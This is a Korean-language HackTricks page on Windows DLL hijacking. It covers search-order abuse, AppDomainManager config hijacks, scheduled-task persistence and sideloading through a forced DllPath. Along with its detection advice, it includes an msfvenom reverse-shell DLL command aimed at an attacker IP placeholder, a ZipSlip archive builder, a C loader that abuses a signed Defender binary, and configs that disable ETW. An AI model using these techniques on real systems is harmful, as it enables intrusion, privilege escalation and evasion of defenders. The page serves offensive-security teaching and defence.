# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰할 수 있는 애플리케이션이 악성 DLL을 로드하도록 조작하는 기법입니다. 이 용어에는 **DLL Spoofing, Injection, Side-Loading** 등 여러 전술이 포함됩니다. 주로 코드 실행과 persistence 확보에 사용되며, 권한 상승에는 비교적 덜 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, hijacking 방식은 목표에 관계없이 동일합니다.

### 일반적인 기법

DLL Hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL 로딩 방식에 따라 달라집니다:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 정품 DLL을 악성 DLL로 교체합니다. 필요하면 DLL Proxying을 사용해 원본 DLL의 기능을 유지할 수 있습니다.
2. **DLL Search Order Hijacking**: 애플리케이션의 검색 패턴을 악용해 정품 DLL보다 앞선 검색 경로에 악성 DLL을 배치합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL이라고 생각하고 로드하도록 악성 DLL을 만듭니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 로드하도록 유도합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리의 정품 DLL을 악성 DLL로 대체합니다. 이 방법은 DLL side-loading과 함께 사용되는 경우가 많습니다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 악성 DLL을 사용자가 제어할 수 있는 디렉터리에 배치합니다. Binary Proxy Execution 기법과 비슷합니다.

애플리케이션이 **자체 DLL loader**를 구현할 수도 있습니다. 권한 있는 프로세스가 `Libraries` 또는 `Plugins` 같은 하위 디렉터리를 열거한 다음, 일반 Windows DLL 검색 순서와 무관하게 선택한 DLL을 helper에 전달할 수 있습니다. 다른 계정이 해당 디렉터리에 파일을 만들 수 있다면 이를 검토 대상으로 삼으세요. 프로세스의 실행 계정, 디렉터리의 유효 ACL, 파일 선택 규칙, 실제 로드 경로에 도달할 수 있는지 확인해야 합니다. 실행 파일 옆의 디렉터리에 쓰기 권한이 있다는 사실만으로 해당 프로세스가 그곳에서 DLL을 로드한다고 단정할 수는 없습니다.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### 설치 후 PE import grafting

기존 side-loading은 신뢰할 수 있는 PE를 변경하지 않고 DLL 이름 확인 과정을 악용합니다. 반면 **Import grafting**은 신뢰할 수 있는 프로그램이 이미 로드한 PE를 수정합니다. 공격자는 공격자가 제어하는 DLL을 참조하도록 import descriptor와 관련 lookup/IAT 항목을 추가합니다. Windows가 해당 종속성을 재귀적으로 확인하면 추가된 DLL을 매핑하고, 원래는 정상인 프로세스 안에서 초기화 코드를 실행합니다. 이는 디스크에 있는 PE를 수정하는 것으로, 실행 중인 IAT 함수 포인터를 runtime hook으로 교체하는 작업과는 다릅니다.<sup>[[26]](#references)[[27]](#references)</sup>

수정되는 PE는 사용자가 실행하거나 Task Scheduler가 시작하는 실행 파일이 아니라 중간 단계의 vendor DLL일 수도 있습니다. 재사용 가능한 공격 흐름은 다음과 같습니다:<sup>[[27]](#references)</sup>

1. 정품 실행 파일과 종속 파일을 공격자가 제어하는 디렉터리에 복사합니다.
2. 한 종속 파일의 import 구조를 패치해 악성 DLL을 참조하게 하되, 해당 종속 파일에서 기대하는 exports와 정상 동작은 유지합니다.
3. autorun 또는 scheduled task가 정품 실행 파일을 시작하도록 설정합니다. loader는 변경된 종속 파일을 매핑한 다음 새로 import된 DLL을 매핑합니다. 작업 열거 방법은 [Autoruns를 통한 권한 상승](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks)을 참조하세요.
4. `DllMain`에서 많은 작업을 하지 않도록 합니다. 관찰된 loader는 worker thread를 생성한 뒤 그곳에서 단계별 복호화를 계속했습니다.

vendor 패키지가 깨끗하고 설치 후 import 수정이 이루어진 경우, 이는 vendor 측 supply-chain compromise와 다릅니다. staged 디렉터리의 모든 모듈을 triage하고 host EXE만 살펴보지 마세요. 종속 파일의 import 목록과 hash를 정상 설치본과 비교하고, 서명을 확인하며, `C:\ProgramData` 같은 예상치 못한 쓰기 가능한 위치에서 실행되는 vendor binary를 조사하세요. 이런 디렉터리에 복사된 crash reporter 또는 updater를 가리키는 scheduled task는 특히 유용한 pivot입니다.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading만이 신뢰할 수 있는 **.NET Framework** 프로세스에서 공격자 코드를 로드하는 방법은 아닙니다. 대상 실행 파일이 **managed** 애플리케이션이면 CLR은 실행 파일 이름을 딴 **application configuration file**(예: `Setup.exe.config`)도 참조합니다. 이 파일에서 사용자 지정 **AppDomainManager**를 정의할 수 있습니다. 설정 파일이 EXE 옆에 있는 공격자 제어 assembly를 가리키면 CLR은 **애플리케이션의 일반 코드 경로가 실행되기 전에** 해당 assembly를 로드하고 신뢰할 수 있는 프로세스 안에서 실행합니다.<sup>[[24]](#references)</sup>

Microsoft의 .NET Framework configuration schema에 따르면 사용자 지정 manager를 사용하려면 `<appDomainManagerAssembly>`와 `<appDomainManagerType>`이 모두 있어야 합니다.<sup>[[16]](#references)[[17]](#references)</sup>

최소 설정:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

최소한의 관리자:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

실무 참고 사항:
- 이 기법은 **.NET Framework 전용** tradecraft입니다. Win32 DLL 검색 순서가 아니라 CLR의 config 파싱에 의존합니다.
- 호스트는 실제로 **managed EXE**여야 합니다. 빠른 확인 방법: `sigcheck -m target.exe`, `corflags target.exe`를 사용하거나 PE 메타데이터에서 **CLR Runtime Header**를 확인합니다.
- config 파일 이름은 실행 파일 이름과 정확히 일치해야 하며(`<binary>.config`), 보통 **EXE와 같은 디렉터리**에 있습니다.
- **서명된 Microsoft/벤더 바이너리**를 대상으로 유용합니다. 신뢰된 EXE는 그대로 두고 악성 managed assembly를 프로세스 내에서 실행할 수 있습니다.
- 쓰기 가능한 installer/update 디렉터리가 이미 있다면 AppDomainManager hijacking을 **첫 단계**로 사용하고, 이후 단계에는 일반적인 DLL sideloading이나 reflective loading을 사용할 수 있습니다.

### downloader 및 scheduled-task 부트스트랩으로서의 AppDomainManager

실용적인 침입 패턴은 신뢰된 managed EXE와 악성 `*.config` 및 **작은 bootstrapper** 역할만 하는 악성 AppDomainManager DLL을 함께 사용하는 것입니다:<sup>[[25]](#references)</sup>

1. 사용자가 `%USERPROFILE%\Downloads`처럼 그럴듯한 위치에서 서명된 .NET installer 또는 updater를 실행합니다.
2. 인접한 config로 인해 정상적인 앱 로직이 시작되기 **전에** CLR이 공격자 assembly를 로드합니다.
3. 악성 manager는 **경로 검사**를 수행합니다(예: 호스트 EXE가 `Downloads`에서 실행 중일 때만 계속 진행하고, 두 번째 단계는 `%LOCALAPPDATA%`에서만 실행되도록 함).
4. 검사를 통과하면 `%LOCALAPPDATA%\PerfWatson2.exe`처럼 사용자가 쓸 수 있는 경로에 실제 payload를 다운로드하고 scheduled task로 지속성을 설정합니다.

이 변형이 중요한 이유:
- 서명된 호스트 EXE는 변경되지 않으므로, 메인 바이너리의 해시만 확인하는 triage에서는 침해를 놓칠 수 있습니다.
- 간단한 **경로 기반 anti-analysis**가 흔합니다. ZIP/EXE/DLL 세트를 Desktop, Temp 또는 sandbox 경로로 옮기면 체인이 의도적으로 중단될 수 있습니다.
- 첫 단계의 AppDomainManager DLL은 작고 탐지하기 어렵게 유지하면서 실제 implant는 나중에 가져올 수 있습니다.

이 패턴에서 자주 볼 수 있는 최소한의 지속성 예시:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest`는 해당 사용자/세션에서 사용 가능한 **최고 권한**을 의미하며, 이것만으로 SYSTEM 권한 상승이 보장되지는 않습니다.
- 이 기법은 전통적인 누락 DLL 검색 순서 하이재킹이라기보다 **.NET config 악용을 통한 실행/지속성**으로 분류하는 편이 더 적절한 경우가 많습니다. 다만 공격자는 둘을 함께 사용하는 경우가 많습니다.

탐지 단서:
- **ZIP 압축 해제 경로**, `Downloads`, `%TEMP%` 또는 기타 사용자가 쓰기 가능한 폴더에서 실행된 서명된 .NET 실행 파일과, 같은 위치에 있는 `<exe>.config`.
- 작업 동작이 `%LOCALAPPDATA%`, `%APPDATA%` 또는 `Downloads` 내 경로를 가리키고, 이름이 브라우저/공급업체 업데이트 프로그램을 흉내 내는 새 예약 작업.
- 다른 EXE를 바로 다운로드한 다음 `schtasks.exe`를 실행하는, 짧게 실행되는 관리형 부트스트랩 프로세스.
- 실행 파일 경로가 예상된 사용자 프로필 디렉터리와 일치하지 않으면 일찍 종료되는 샘플.

### 기존 예약 작업을 하이재킹해 sideload 체인을 다시 실행하기

지속성을 찾을 때 **새 작업 생성**만 살펴보지 마세요. 일부 침입 그룹은 정상적인 설치 프로그램이 **일반 업데이트 작업**을 생성할 때까지 기다렸다가 기존 작업의 동작을 **다시 작성**합니다. 그러면 기존 이름, 작성자, 트리거가 그대로 유지되어 방어자에게 익숙해 보입니다.

재사용 가능한 워크플로:
1. 정상 소프트웨어를 설치/실행하고, 일반적으로 생성되는 작업을 식별합니다.
2. 작업 XML을 내보내고 현재 `<Exec><Command>` / `<Arguments>` 값을 기록합니다.<sup>[[23]](#references)</sup>
3. 동작만 바꿔, 작업이 사용자가 쓰기 가능한 스테이징 디렉터리에 있는 **신뢰할 수 있는 호스트 EXE**를 시작하도록 합니다. 그러면 해당 EXE가 실제 페이로드를 sideload하거나 AppDomain-load합니다.
4. 눈에 띄는 새 지속성 흔적을 만들지 말고, 같은 작업 이름을 사용해 다시 등록합니다.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

왜 더 은밀한가:
- 작업 이름은 여전히 정상적으로 보일 수 있습니다(예: 공급업체 업데이트 프로그램).
- **Task Scheduler 서비스**가 이를 실행하므로, 부모/조상 프로세스 검증 시 `explorer.exe` 대신 예상된 스케줄링 체인이 표시되는 경우가 많습니다.
- **새 작업 이름만** 탐지하는 DFIR 팀은 등록은 이미 되어 있지만 작업 동작이 `%LOCALAPPDATA%`, `%APPDATA%` 또는 공격자가 제어하는 다른 경로를 가리키도록 변경된 작업을 놓칠 수 있습니다.

빠른 헌팅 기준:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML 및 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 메타데이터를 기준선과 비교합니다.
- **사용자가 쓰기 가능한 디렉터리**에서 실행되거나, 같은 위치에 `*.config` 파일이 있는 .NET EXE를 실행하는 **공급업체 업데이트 프로그램처럼 보이는 작업**에 경고를 설정합니다.

> [!TIP]
> DLL sideloading에 HTML 스테이징, AES-CTR configs, .NET implants를 결합한 단계별 체인은 아래 워크플로를 참고하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 DLL 찾기

시스템에서 누락된 Dlls를 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, **다음 2개의 필터를 설정하는 것**입니다.

![일반적인 기법 - 누락된 Dlls 찾기: 시스템에서 누락된 Dlls를 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개의 필터를 설정하는 것입니다](<../../../images/image (961).png>)

![일반적인 기법 - 누락된 Dlls 찾기: 시스템에서 누락된 Dlls를 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개의 필터를 설정하는 것입니다](<../../../images/image (230).png>)

그런 다음 **File System Activity**만 표시합니다.

![일반적인 기법 - 누락된 Dlls 찾기: File System Activity만 표시합니다](<../../../images/image (153).png>)

**일반적으로 누락된 dlls**를 찾는 경우 몇 **초 동안** 실행 상태로 둡니다.\
**특정 실행 파일에서 누락된 DLL**을 찾는 경우 **"Process Name" "contains" `<exec name>`**과 같은 필터를 추가로 설정하고, 해당 실행 파일을 실행한 다음 이벤트 캡처를 중지합니다.<sup>[[9]](#references)</sup>

## 누락된 DLL 악용하기

권한을 상승시키려면 권한이 높은 프로세스가 쓰기 가능한 위치에서 로드하려는 **DLL**을 찾습니다. 이는 정상 DLL이 있는 디렉터리보다 먼저 검색되는 디렉터리를 제어할 수 있거나, 요청된 DLL이 존재하지 않고 검색 대상 디렉터리 중 하나에 쓸 수 있을 때 발생할 수 있습니다.

### Dll 검색 순서

**[Microsoft 문서](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 구체적으로 어떻게 로드되는지 확인할 수 있습니다.**

**Windows 애플리케이션**은 **미리 정의된 검색 경로**를 정해진 순서로 따라 DLL을 찾습니다. DLL hijacking은 악성 DLL을 이 디렉터리 중 하나에 전략적으로 배치해 정품 DLL보다 먼저 로드되도록 할 때 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 해야 합니다.

아래에서 **32비트** 시스템의 **DLL 검색 순서**를 확인할 수 있습니다.

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 이 디렉터리의 경로를 가져옵니다.(_C:\Windows\System32_)
3. 16비트 시스템 디렉터리. 이 디렉터리의 경로를 가져오는 함수는 없지만, 검색 대상입니다. (_C:\Windows\System_)
4. Windows 디렉터리. [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 이 디렉터리의 경로를 가져옵니다.
   1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리. 여기에는 **App Paths** 레지스트리 키에 지정된 애플리케이션별 경로가 포함되지 않습니다. DLL 검색 경로를 계산할 때 **App Paths** 키는 사용되지 않습니다.

위 순서는 **SafeDllSearchMode**가 활성화된 경우의 **기본** 검색 순서입니다. 비활성화하면 현재 디렉터리가 두 번째 순서로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정합니다(기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 파일 모듈의 디렉터리에서 시작됩니다.

마지막으로 DLL은 이름이 아니라 절대 경로로 로드할 수 있습니다. 이 경우 Windows는 해당 DLL을 찾을 때 지정된 경로만 확인합니다. 이름으로 요청된 종속 항목은 여전히 적용 가능한 검색 순서를 따릅니다.

검색 순서를 변경하는 다른 방법도 있지만 여기서는 설명하지 않겠습니다.

### 임의 파일 쓰기를 누락된 DLL hijack으로 연결하기

**관련 기법:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** 필터(`Process Name` = 대상 EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`)를 사용해 프로세스가 찾으려 했지만 찾지 못한 DLL 이름을 수집합니다.<sup>[[14]](#references)</sup>
2. 바이너리가 **스케줄 또는 서비스**로 실행된다면, 그 이름 중 하나를 가진 DLL을 **애플리케이션 디렉터리**(검색 순서 #1)에 배치하면 다음 실행 시 로드됩니다. 한 .NET scanner 사례에서 프로세스는 실제 사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾았습니다.
3. 임의의 export가 있는 payload DLL(예: reverse shell)을 빌드합니다. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. 기본 수단이 **ZipSlip 방식의 임의 쓰기**라면, 항목이 압축 해제 디렉터리를 벗어나 DLL이 앱 폴더에 저장되도록 ZIP을 만듭니다.

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. 아카이브를 감시 중인 inbox/share에 전달합니다. 예약된 작업이 프로세스를 다시 실행하면 악성 DLL이 로드되고 서비스 계정 권한으로 코드가 실행됩니다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통해 sideloading 강제하기

새로 생성되는 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 native API를 사용해 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 공격자가 제어하는 디렉터리를 여기에 지정하면, 이름으로 가져온 DLL을 확인하는 대상 프로세스(절대 경로를 사용하지 않고 안전한 로딩 플래그도 사용하지 않는 경우)가 해당 디렉터리에서 악성 DLL을 로드하도록 할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 매개변수를 구성하고 제어하는 폴더(예: dropper/unpacker가 있는 디렉터리)를 가리키는 사용자 지정 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 이름으로 DLL을 확인하면, 로더는 확인 과정에서 지정된 DllPath를 참조하므로 악성 DLL이 대상 EXE와 같은 디렉터리에 없어도 안정적으로 sideloading할 수 있습니다.

참고 사항/제한 사항
- 이는 생성되는 자식 프로세스에 영향을 줍니다. 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 가져오거나 LoadLibrary를 사용해야 합니다(절대 경로를 사용하지 않고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories도 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. 전달된 export와 SxS에 따라 우선순위가 달라질 수 있습니다.

최소 C 예제(ntdll, wide string, 간소화된 오류 처리):

<details>
<summary>전체 C 예제: RTL_USER_PROCESS_PARAMETERS.DllPath를 통해 DLL sideloading 강제하기</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

운용 예시
- 필요한 함수를 내보내거나 실제 DLL로 프록시하는 악성 xmllite.dll을 DllPath 디렉터리에 배치합니다.
- 위 기법을 사용해 xmllite.dll을 이름으로 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 지정된 DllPath를 통해 가져오기를 확인하고 DLL을 sideloading합니다.

이 기법은 실제 공격에서 여러 단계의 sideloading 체인을 구동하는 데 사용된 사례가 있습니다. 초기 실행 프로그램이 도우미 DLL을 드롭하고, 이 DLL이 사용자 지정 DllPath를 지정해 Microsoft 서명된 하이재킹 가능 바이너리를 실행함으로써 스테이징 디렉터리에 있는 공격자 DLL을 강제로 로드합니다.<sup>[[6]](#references)</sup>


### `.exe.config`를 통한 .NET AppDomainManager 하이재킹

**.NET Framework** 대상에서는 애플리케이션에 인접한 **`.exe.config`** 파일을 악용해 메모리를 패치하지 않고도 **`Main()` 이전에** sideloading할 수 있습니다. 공격자는 Win32 DLL 검색 순서에만 의존하는 대신, 정상적인 .NET EXE와 악성 config 파일 및 공격자가 제어하는 하나 이상의 어셈블리를 같은 디렉터리에 배치합니다.

공격 체인의 동작 방식:<sup>[[15]](#references)[[22]](#references)</sup>
1. 호스트 EXE가 시작되고 **CLR이 `<exe>.config`를 읽습니다**.
2. config가 **`<appDomainManagerAssembly>`** 및 **`<appDomainManagerType>`**을 설정해 런타임이 공격자가 제어하는 `AppDomainManager`를 인스턴스화하도록 합니다.
3. 악성 manager가 신뢰된 호스트 프로세스 내부에서 **`Main()` 이전에 코드를 실행합니다**.
4. 같은 config를 사용해 CLR이 로컬 어셈블리(예: `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`)를 먼저 확인하도록 강제하고, 인라인 패치 없이 런타임 검증 및 텔레메트리를 약화할 수 있습니다.

캠페인 유형의 패턴(정확한 중첩 구조는 지시문 및 CLR 버전에 따라 다를 수 있음):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

유용한 이유:
- **`<probing privatePath="."/>`**는 assembly resolution을 애플리케이션 디렉터리로 제한하여, 해당 폴더를 예측 가능한 sideloading 표면으로 만듭니다.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**는 CLR 초기화 중, 정상적인 앱 로직이 실행되기 전에 실행을 공격자 코드로 이동시킵니다.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**를 사용하면 full-trust 앱에서 strong-name 검증 실패 없이 unsigned 또는 변조된 assembly를 로드할 수 있습니다.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**는 publisher-policy에 따른 최신 assembly로의 리디렉션을 방지합니다.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**는 runtime 선택을 더 결정적으로 만듭니다.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**는 특히 흥미롭습니다. implant가 메모리에서 `EtwEventWrite`를 패치하는 대신, 설정을 통해 **CLR이 자체 ETW 가시성을 비활성화**하기 때문입니다.

최근 캠페인에서 관찰된 작전 패턴:
- 1단계: `setup.exe`, `setup.exe.config` 및 로컬 assembly를 배치합니다.
- 2단계: 이를 그럴듯한 **AppData 업데이트** 폴더로 복사하고, 호스트 이름을 `update.exe` 같은 이름으로 변경한 뒤 **scheduled task**를 통해 다시 실행합니다.
- 3단계: 최종 RAT DLL/export를 로드하기 전에 실행 컨텍스트(예: Task Scheduler에서 시작된 예상 부모 `svchost.exe`)를 확인합니다.

탐지 아이디어:
- 사용자 쓰기 가능 위치에서 의심스러운 인접 **`.config`** 파일과 함께 실행되는 서명되었거나 그 밖에 정상적인 **.NET 실행 파일**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** 또는 **`etwEnable enabled="false"`**가 포함된 `.config` 파일.
- **`%LOCALAPPDATA%`** 또는 앱별 `\bin\update\` 디렉터리에서 이름이 변경된 업데이트 바이너리를 다시 실행하는 scheduled task.
- scheduled task가 신뢰할 수 있는 .NET 호스트를 시작하고, 해당 호스트가 자신의 디렉터리에서 비공급업체 assembly를 즉시 로드하는 부모/자식 프로세스 연결.

#### Windows 문서에 명시된 DLL 검색 순서의 예외

Windows 문서에는 표준 DLL 검색 순서에 대한 특정 예외가 명시되어 있습니다.

- **메모리에 이미 로드된 DLL과 이름이 같은 DLL**을 만나면 시스템은 일반적인 검색을 건너뜁니다. 대신 리디렉션과 manifest를 확인한 뒤, 기본적으로 메모리에 이미 있는 DLL을 사용합니다. **이 시나리오에서 시스템은 DLL을 검색하지 않습니다**.
- DLL이 현재 Windows 버전의 **known DLL**로 인식되면 시스템은 해당 known DLL 버전과 그 종속 DLL을 사용하며, **검색 절차는 생략합니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL 목록이 있습니다.
- **DLL에 종속성이 있는 경우**, 처음 DLL이 전체 경로로 식별되었더라도 종속 DLL은 **모듈 이름만으로 지정된 것처럼** 검색됩니다.

### 권한 상승

**요구 사항**:

- **다른 권한**(수평 또는 측면 이동)으로 실행되거나 실행될 프로세스 중 **DLL이 누락된** 프로세스를 찾습니다.
- **DLL**을 검색할 **디렉터리**에 대해 **쓰기 권한**이 있는지 확인합니다. 해당 위치는 실행 파일의 디렉터리일 수도 있고 시스템 경로 내의 디렉터리일 수도 있습니다.

이러한 전제 조건은 기본적으로 흔하지 않습니다. 권한이 높은 실행 파일에 DLL 종속성이 누락된 경우는 드물고, 일반 사용자는 보통 시스템 검색 경로의 디렉터리에 쓸 수 없습니다. 하지만 잘못 구성된 환경에서는 두 조건 모두 노출될 수 있습니다.\
요구 사항이 충족되면 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인하세요. 주요 목적은 UAC bypass이지만, 특정 Windows 버전용 DLL hijacking PoC가 포함되어 있으며, 발견한 쓰기 가능 디렉터리에 맞게 조정할 수 있는 경우가 많습니다.

다음과 같이 **폴더에 대한 권한을 확인**할 수 있습니다:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

그리고 **PATH 내 모든 폴더의 권한을 확인하세요**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

다음 명령으로 실행 파일의 import 항목과 DLL의 export 항목도 확인할 수 있습니다:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For a full guide on how to **DLL Hijacking을 악용해 권한을 상승시키는 방법** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)은 system PATH 내의 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**인 _Find-ProcessDLLHijack_, _Find-PathDLLHijack_, _Write-HijackDll_이 있습니다.

### Example

